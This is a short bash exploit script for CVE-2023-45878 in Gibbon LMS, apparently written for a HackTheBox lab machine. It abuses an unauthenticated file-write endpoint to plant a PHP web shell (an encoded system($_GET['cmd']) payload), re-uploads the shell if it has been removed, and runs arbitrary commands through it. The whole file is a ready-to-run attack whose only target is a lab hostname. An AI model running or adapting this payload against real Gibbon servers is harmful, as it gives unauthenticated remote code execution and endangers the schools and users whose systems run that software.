#!/usr/bin/env bash
# CVE-2023-45878

BASE_URL='http://frizzdc.frizz.htb/Gibbon-LMS'
COMMAND="${@:1}"
URL_ENCODED_COMMAND=$(echo -n "$COMMAND" | jq -SRr @uri)
RCE="${BASE_URL}/asdf.php"
VULNERABLE_URL="${BASE_URL}/modules/Rubrics/rubrics_visualise_saveAjax.php"
# PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b = URL encoded base64 data
# URL-decoded: PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8+
# Base64-decoded: <?php echo system($_GET['cmd'])?>
# Vulnerable URL does not require authentication
# Does not validate content type or file extensions on 'path' query parameter
PAYLOAD='img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKT8%2b&path=asdf.php&gibbonPersonID=0000000001'

if [[ -z "${@:1}" ]] ; then
    echo "Usage: $0 REMOTE_COMMAND"
elif ! which jq >/dev/null ; then
    echo "Package 'jq' required for URL encoding payloads. Please install."
else
    # Ensure the file has not been wiped
    if ! curl -sI "$RCE" | grep 'HTTP/1.1 200 OK' > /dev/null; then
        curl -s "$VULNERABLE_URL" -d "$PAYLOAD" >/dev/null
    fi
    curl -s "$RCE?cmd=${URL_ENCODED_COMMAND}"
fi
